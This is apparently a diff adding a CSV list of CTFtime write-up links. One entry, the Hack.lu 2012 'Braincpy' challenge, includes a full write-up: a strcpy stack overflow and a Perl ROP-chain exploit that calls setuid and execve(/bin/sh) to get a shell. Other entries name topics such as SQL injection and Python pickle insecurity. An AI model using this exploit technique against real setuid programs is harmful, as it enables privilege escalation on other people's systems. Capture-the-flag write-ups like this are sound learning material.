@@ -1,0 +1,22 @@
+"title","url","tags","description"
+"SecureFileLock","https://ctftime.org/writeup/9","","Actually, a very stupid hack instead of a nicely written RE write-up."
+"yhsj","https://ctftime.org/writeup/15","sqli, web, writeup","Quick write-up about the yhsj web challenge. There was other longer solution as SQL Injection but mine is probably one of the fastest."
+"Braincpy","https://ctftime.org/writeup/54","bin, x86","Hack.lu 2012 Braincpy (300) Writeup by cutzctf@braincpy:~$ file braincpybraincpy: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.9, not stripped
+Braincpy was an ELF, according to file 32 bits and statically linked.
+ctf@braincpy:~$ file braincpybraincpy: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.9, not stripped
+Running it with a long argv[1] yielded in a direct strcpy() stackoverflow:
+(gdb) r `perl -e 'print """"A""""x96'`The program being debugged has been started already.Start it from the beginning? (y or n) y
+Starting program: /home/ctf/braincpy `perl -e 'print """"A""""x96'`NOMNOMNOM!
+Program received signal SIGSEGV, Segmentation fault.0x41414141 in ?? ()
+However if we use more than 96 chars, which is exactly enough to smash EIP, it exits before the overflow can happen.
+ASLR and NX were activated, so you carefully had to choose your gadgets. I chose a nice ESP pivoting gadget with help of EBP at 0x080df815, so afterwards ESP would point backto the beginning of the buffer. There we had enough space to setuid(1001) and execve(/bin/sh).Exploit looked like this:
+#!/usr/bin/perl# hack.lu 2012 Braincpy exploit# run with ./braincpy """"`perl expl.pl`""""# cutz
+$payload =
+pack(""""I"""", 0x080dbc2c). # pop %ecxpack(""""I"""", 0x080d0a4e). # ptr-0xa => 1001 pack(""""I"""", 0x080dbfcf). # add $0xa(%ecx), %ebxpack(""""I"""", 0x080beb89). # pop %eaxpack(""""I"""", 0xffffffe9). # -23pack(""""I"""", 0x08054e7f). # neg %eaxpack(""""I"""", 0x0805b5c0). # int $0x80pack(""""I"""", 0x0805adec). # pop %edxpack(""""I"""", 0x080e4701). # +wpack(""""I"""", 0x080beb89). # pop %eax""""//sh"""".pack(""""I"""", 0x080dbc2c). # pop %ecx """"/bin"""".pack(""""I"""", 0x08048c0c). # mov %ecx, $0x14(%edx) ; mov %ebp, $0xc(%edx) ; mov %eax, $0x18(%edx)pack(""""I"""", 0x0805ae15). # pop %edx, pop %ecx, pop %ebxpack(""""I"""", 0x080e4701). # 0pack(""""I"""", 0x080e4701). # 0pack(""""I"""", 0x080e4715). # +w + 0x14pack(""""I"""", 0x080beb89). # pop %eaxpack(""""I"""", 0xfffffff5). # -11pack(""""I"""", 0x08054e7f). # neg %eaxpack(""""I"""", 0x0805b5c0). # int $0x80pack(""""I"""", 0x08086c12). # ptr-0xa => 0xffffffa0pack(""""I"""", 0x080df815); # add $0xa(%ebp), %esp
+print $payload
+So: 
+ctf@braincpy:~$ ./braincpy """"`perl /tmp/cutz_STUFF/expl.pl`""""$ cat FLAGROP_GOLF_IS_A_NICE_GAME"
+"Spambot","https://ctftime.org/writeup/67","writeup","Spambot writeup"
+"Zombie reminder","https://ctftime.org/writeup/79","python","Python pickle insecurity"
+"zombie AV","https://ctftime.org/writeup/88","","Part II - Modified getEntryPoint()"
+"It's not scientific without LaTeX","https://ctftime.org/writeup/90","scientific, latex, writeup","Hack.Lu CTF 2012 LaTeX Challenge Writeup"
